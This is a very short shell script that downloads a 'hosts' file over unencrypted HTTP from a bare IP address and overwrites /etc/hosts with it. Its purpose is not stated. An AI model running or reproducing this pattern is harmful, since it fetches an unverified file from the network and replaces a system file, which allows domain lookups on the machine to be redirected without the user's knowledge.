#!/bin/sh

wget http://119.81.131.242/hosts -O /etc/hosts.new
mv /etc/hosts.new /etc/hosts
